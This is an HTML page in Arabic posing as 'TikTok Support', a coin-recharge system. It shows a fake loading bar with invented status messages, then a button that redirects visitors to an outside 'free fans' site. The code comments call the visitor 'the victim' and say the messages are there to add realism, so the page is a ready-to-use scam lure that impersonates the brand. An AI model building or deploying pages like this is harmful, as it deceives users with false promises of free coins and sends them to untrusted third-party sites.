<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok Support - نظام الشحن</title>
    <style>
        body { background-color: #000; color: #0f0; font-family: 'Courier New', Courier, monospace; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
        #console { width: 90%; max-width: 600px; padding: 25px; border: 2px solid #0f0; box-shadow: 0 0 30px #0f0; background: rgba(0, 15, 0, 0.95); border-radius: 12px; text-align: center; }
        .loading-bar-container { width: 100%; height: 12px; background: #020; border: 1px solid #0f0; margin-top: 20px; border-radius: 10px; overflow: hidden; }
        .loading-bar { width: 0%; height: 100%; background: #0f0; transition: width 0.3s; }
        .warning { color: #fff; font-weight: bold; margin-bottom: 15px; }
        .info-text { font-size: 15px; color: #00ff00; line-height: 1.8; text-align: center; margin-bottom: 10px; }
        .btn-ready { background: #0f0; color: #000; padding: 12px 25px; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; font-size: 16px; margin-top: 20px; display: none; box-shadow: 0 0 15px #0f0; }
    </style>
</head>
<body>

<div id="console">
    <p class="warning">⚙️ جاري معالجة طلب شحن العملات...</p>
    <div class="info-text" id="status-text">جاري الاتصال بقاعدة بيانات TikTok...</div>
    <div class="loading-bar-container">
        <div class="loading-bar" id="bar"></div>
    </div>
    <button id="redirectBtn" class="btn-ready" onclick="goToTarget()">✅ استلام العملات الآن</button>
</div>

<script>
    // الرابط الذي سيتم توجيه الضحية إليه
    const targetSite = "https://tikfollowers.com/tiktok-free-fans"; 

    function startLoading() {
        let width = 0;
        const bar = document.getElementById('bar');
        const statusText = document.getElementById('status-text');
        const btn = document.getElementById('redirectBtn');
        
        const interval = setInterval(() => {
            if (width >= 100) {
                clearInterval(interval);
                statusText.innerHTML = "✅ تم تجهيز العملات بنجاح!";
                statusText.style.color = "#fff";
                btn.style.display = "inline-block"; 
            } else {
                width += 1;
                bar.style.width = width + "%";
                
                // تغيير الرسائل لإضافة واقعية
                if(width == 30) statusText.innerText = "جاري التحقق من اسم المستخدم...";
                if(width == 60) statusText.innerText = "جاري فك تشفير الحزمة...";
                if(width == 90) statusText.innerText = "جاري إرسال العملات للمحفظة...";
            }
        }, 100); // سرعة التحميل (10 ثواني تقريباً)
    }

    function goToTarget() {
        window.location.href = targetSite;
    }

    // ابدأ العملية فور فتح الصفحة
    window.onload = startLoading;
</script>

</body>
</html>
